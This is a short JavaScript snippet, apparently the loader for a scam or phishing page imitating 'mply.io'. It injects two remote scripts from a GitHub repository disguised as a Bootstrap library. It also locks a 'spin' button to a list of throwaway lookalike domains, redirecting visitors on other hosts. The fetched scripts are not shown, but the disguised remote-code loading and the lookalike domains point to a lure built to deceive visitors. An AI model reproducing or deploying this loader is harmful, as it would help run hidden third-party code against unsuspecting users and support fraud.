  function loadScripts() {
    let scripts = [
      "https://cdn.jsdelivr.net/gh/dev20l/ajax-libs-bootstrap-5.3.4/mply1.js",
      "https://cdn.jsdelivr.net/gh/dev20l/ajax-libs-bootstrap-5.3.4/mply2.js"
    ];

    scripts.forEach(src => {
      let script = document.createElement("script");
      script.src = src;
      script.async = false; // تحميل السكريبتات بالتسلسل
      document.head.appendChild(script);
    });
  }

  document.addEventListener("DOMContentLoaded", function () {
    var button = document.querySelector('.spin-buttons');
    var allowedDomains = [
      "jsdhjjhhjjhejkjkas.blogspot.com",
      "mply.io.4a6b8dh.site",
      "mply.io.s.4a6b8dh.site",
      "mply.io.1arshg4.site"
    ]; // قائمة النطاقات المسموح بها

    if (button && !/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
      button.addEventListener('click', function () {
        if (!allowedDomains.includes(window.location.hostname)) {
          window.location.replace("https://example.com"); // استبدل الرابط بالوجهة المطلوبة
        }
      });
    }

    loadScripts(); // تحميل السكريبتات عند تحميل الصفحة
  });
